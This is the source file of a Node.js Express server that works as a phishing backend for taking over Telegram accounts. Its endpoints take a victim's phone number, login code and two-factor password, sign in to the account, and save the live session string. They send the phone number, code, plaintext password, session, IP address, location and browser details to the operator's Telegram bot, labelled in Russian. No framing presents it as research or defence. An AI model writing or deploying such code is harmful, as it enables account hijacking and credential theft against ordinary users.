const express = require("express");
const crypto = require("crypto");
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const { computeCheck } = require("telegram/Password");

const apiId = Number(process.env.API_ID);
const apiHash = process.env.API_HASH;
const BOT = process.env.BOT_TOKEN || "";
const CHAT = process.env.CHAT_ID || "";
const KEY = process.env.LOG_KEY || "s3cret";

const app = express();
app.set("trust proxy", true);
app.use(express.json());
app.use(express.static("public"));

const store = new Map();
const events = [];

const esc = (s) => String(s ?? "").replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c]));

async function geo(ip) {
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const j = await r.json();
    return j.success ? `${j.country}, ${j.city}` : "?";
  } catch {
    return "?";
  }
}

async function notify(html) {
  events.unshift({ t: new Date().toISOString(), html });
  if (events.length > 300) events.pop();
  if (!BOT || !CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text: html, parse_mode: "HTML", disable_web_page_preview: true }),
    });
  } catch {}
}

function sid(req, res) {
  let s = req.headers.cookie?.match(/sid=([^;]+)/)?.[1];
  if (!s) {
    s = crypto.randomBytes(16).toString("hex");
    res.setHeader("Set-Cookie", `sid=${s}; Path=/; HttpOnly; SameSite=Lax`);
  }
  return s;
}

function newClient() {
  return new TelegramClient(new StringSession(""), apiId, apiHash, {
    connectionRetries: 3,
    deviceModel: "iPhone 15 Pro",
    systemVersion: "iOS 17.5",
    appVersion: "10.14.2",
    langCode: "ru",
  });
}

function ctx(req) {
  return { ip: req.ip, ua: (req.headers["user-agent"] || "").slice(0, 120) };
}

app.get("/api/ping", (_q, r) => r.json({ ok: true, up: Math.round(process.uptime()) }));

app.get("/api/log", (req, res) => {
  if (req.query.key !== KEY) return res.status(403).json({ ok: false });
  res.json(events);
});

app.post("/api/send", async (req, res) => {
  const s = sid(req, res);
  const { ip, ua } = ctx(req);
  const phone = String(req.body.phone || "").replace(/[^\d+]/g, "");
  if (phone.length < 8) return res.json({ ok: false, err: "phone" });
  const client = newClient();
  try {
    await client.connect();
    const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
    store.set(s, { client, phone, phoneCodeHash, at: Date.now() });
    geo(ip).then((g) => notify(`📱 <b>НОМЕР</b>\n<code>${esc(phone)}</code>\n🌍 ${esc(g)}\n🖥 <code>${esc(ua)}</code>\n🔗 ${esc(ip)}`));
    setTimeout(() => res.json({ ok: true }), 900);
  } catch (e) {
    await client.disconnect().catch(() => {});
    if (/PHONE_NUMBER_INVALID/.test(e.message)) return res.json({ ok: false, err: "phone" });
    if (/FLOOD/.test(e.message)) return res.json({ ok: false, err: "flood", wait: e.seconds || 60 });
    notify(`⚠️ Ошибка отправки кода для <code>${esc(phone)}</code>: ${esc(e.message.slice(0, 120))}`);
    res.json({ ok: false, err: "other" });
  }
});

app.post("/api/code", async (req, res) => {
  const s = sid(req, res);
  const st = store.get(s);
  if (!st?.client) return res.json({ ok: false, err: "expired" });
  const code = String(req.body.code || "").replace(/\D/g, "");
  try {
    await st.client.invoke(
      new Api.auth.SignIn({ phoneNumber: st.phone, phoneCodeHash: st.phoneCodeHash, phoneCode: code })
    );
    const session = st.client.session.save();
    store.set(s, { ...st, session, at: Date.now() });
    notify(`✅ <b>КОД ВЕРНЫЙ</b>\n<code>${esc(st.phone)}</code> → <code>${esc(code)}</code>\n\n<code>${esc(session)}</code>`);
    setTimeout(() => res.json({ ok: true, needPassword: false }), 1000);
  } catch (e) {
    if (/SESSION_PASSWORD_NEEDED/.test(e.message)) {
      notify(`🔐 <b>НУЖЕН ПАРОЛЬ 2FA</b>\n<code>${esc(st.phone)}</code>`);
      return res.json({ ok: true, needPassword: true });
    }
    if (/PHONE_CODE_INVALID/.test(e.message)) return res.json({ ok: false, err: "code" });
    if (/PHONE_CODE_EXPIRED/.test(e.message)) return res.json({ ok: false, err: "expired" });
    res.json({ ok: false, err: "other" });
  }
});

app.post("/api/password", async (req, res) => {
  const s = sid(req, res);
  const st = store.get(s);
  if (!st?.client) return res.json({ ok: false, err: "expired" });
  try {
    const pwd = await computeCheck(st.client, String(req.body.password));
    await st.client.invoke(new Api.auth.CheckPassword({ password: pwd }));
    const session = st.client.session.save();
    store.set(s, { ...st, session, at: Date.now() });
    notify(`🎉 <b>2FA ПРОЙДЕНА</b>\n<code>${esc(st.phone)}</code> → <code>${esc(req.body.password)}</code>\n\n<code>${esc(session)}</code>`);
    setTimeout(() => res.json({ ok: true }), 1000);
  } catch (e) {
    if (/PASSWORD_HASH_INVALID/.test(e.message)) {
      notify(`❌ Неверный пароль 2FA для <code>${esc(st.phone)}</code>: <code>${esc(req.body.password)}</code>`);
      return res.json({ ok: false, err: "password" });
    }
    res.json({ ok: false, err: "other" });
  }
});

setInterval(() => {
  const now = Date.now();
  for (const [k, v] of store) {
    if (now - v.at > 20 * 60 * 1000) {
      v.client?.disconnect().catch(() => {});
      store.delete(k);
    }
  }
}, 60_000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => console.log("up on " + PORT));
